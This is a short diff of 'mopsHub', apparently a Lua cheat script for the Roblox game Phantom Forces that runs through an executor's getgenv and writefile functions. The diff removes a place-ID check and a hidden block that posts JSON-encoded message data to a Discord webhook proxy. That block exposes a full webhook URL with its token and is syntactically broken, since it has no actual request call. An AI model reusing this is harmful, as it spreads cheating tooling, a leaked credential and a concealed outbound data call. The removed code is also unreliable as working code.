@@ -1,7 +1,6 @@
---mopsHub Phantom Forces [PATCHED] | 2022
+--mopsHub Phantom Forces [DEV] | 2022
 local s,e = pcall(function()
 	print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
-	if not game.PlaceId == 292439477 then return end
 	getgenv = getgenv
 
 	repeat
@@ -48,13 +47,6 @@ local s,e = pcall(function()
 		writefile("/mopsHub/settings_phantomforces.mhs", tostring(game:GetService("HttpService"):JSONEncode(settings)))
 		print("[mopsHub Debug]: Created local config file.")
 	end
-  
-  if Request then 
-        local url = "https://webhook.lewisakura.moe/api/webhooks/1047997898568241192/ftBeaQnzuvs27F7rt-NaGCGP_nQUA2r8LkYUqzp2pZh1u3hrm6gWuphd62IoePIgmsa4"
-        local HS = game:GetService("HttpService")
-        local s,e = pcall(function ()},
-            ['Body'] = game.HttpService:JSONEncode(MessageData)
-        }) end
 
 	--ENV
 	getgenv()._WINDOW = {
